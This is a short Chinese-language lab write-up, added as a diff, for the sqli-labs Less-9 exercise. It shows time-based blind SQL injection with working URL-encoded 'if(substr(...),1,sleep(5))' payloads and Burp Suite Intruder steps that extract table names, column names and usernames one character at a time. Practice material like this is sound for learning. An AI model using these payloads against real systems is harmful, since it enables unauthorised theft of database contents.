@@ -1,0 +1,17 @@
+输入id=1',id=2',id=0'以及带上--+字符过滤，显示都为You are in...........，那么不是报错注入不是布尔注入
+使用时间盲注，运行脚本时间盲注.py得到数据库名security
+
+之后可以不写脚本直接使用burpsuite（火狐，代理,打开Proxy的Intercept的Intercept is on）
+刷新页面前将url后缀变为查询语句，假设数据库表第一位为a：
+/Less-9/?id=1%27%20and%20if(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27security%27%20limit%200,1),1,1)=%27a%27,1,sleep(5))--+
+点击Action点击Send To Intruder进行攻击，先将position里面设置为：
+GET /Less-9/?id=1%27%20and%20if(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27security%27%20limit%200,1),1,1)=%27§a§%27,1,sleep(5))--+ HTTP/1.1
+也就是把变量改为a，之后点击Payloads，在Payload Options里点击Add from list...将所有字母都加上，点击右上角Start attack
+可以看到e的length跟别的不一样，可知数据库第一个表第一个字符为e，如此往复得到所有表名
+
+字段同理，语句为（注意要把所有引号和空格变为%形式）：
+/Less-9/?id=1%27%20and%20if(substr((select%20column_name%20from%20information_schema.columns%20where%20table_name=%27users%27%20limit%200,1),1,1)=%27s%27,1,sleep(5))--+
+
+值同理，语句为：
+/Less-9/?id=1%27%20and%20if(substr((select%20username%20from%20security.users%20limit%200,1),1,1)=%27s%27,1,sleep(5))--+
+
